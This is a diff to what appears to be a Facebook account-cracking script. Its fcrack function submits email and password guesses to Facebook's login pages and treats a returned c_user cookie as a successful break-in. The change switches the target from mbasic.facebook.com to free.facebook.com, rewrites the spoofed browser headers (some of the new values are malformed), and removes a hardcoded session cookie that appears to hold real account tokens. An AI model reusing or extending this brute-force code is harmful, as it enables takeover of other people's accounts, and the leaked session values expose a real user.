@@ -825,26 +825,38 @@ def fcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_mbasicfb = {'authority': 'mbasic.facebook.com',
+			header_freefb = {'authority': 'free.facebook.com', 
             'method': 'GET',
-            'path': '/login/?refsrc=deprecated&_rdr',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+
+            'path': '/home.php?',
+
+            'scheme': 'https accept: text/html,application/xhtml+xml,application/xml;q=0.9, image/avit,image/webp,image/apng,*/*;q=0.8, application/signed-exchange: vb3;q=0.9',
+
             'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'cookie': 'sb=nKBSYqRECxyL7RuJr8vc0xu1; datr=nKBSYvrx9hfYlie57qaPOHCi; m_pixel_ratio=0.625; dpr=0.8333333730697632; locale=en_US; fr=0hLscfSFT8A5vSA7Q.AWWM8tISalP71KhdAPk7eCDqueY.Bjtru5.df.AAA.0.0.Bjtzqi.AWU22nq7LRE; c_user=100089252916634; xs=49%3AIyTKkVAReMiuzw%3A2%3A1672952482%3A-1%3A5904; m_page_voice=100089252916634; wd=1024x615',
-            'referer': 'https://mbasic.facebook.com/login/device-based/edit-user/?uid=100089252916634&src=0&refsrc=deprecated&_rdr',
-            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+
+            'accept-language': 'en-US, en q-0.9',
+
+
+            'referer': 'https://free.facebook.com/zero/toggle/nux/?_rdc=1&_rdr',
+
+            'sec-ch-ua': '"Chromium"; v-"107", "Not-A7Brand"; v-"24"',
+
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
+
+            'sec-ch-ua-platform': '"Linux"',
+
             'sec-fetch-dest': 'document',
+
             'sec-fetch-mode': 'navigate',
+
             'sec-fetch-site': 'same-origin',
+
             'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
+
+            'upgrade-insecure-requests': '1', 
+
             'user-agent': ua}
-			lo = session.post('https://mbasic.facebook.com/login/?refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
+			lo = session.post('https://free.facebook.com/home.php?',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
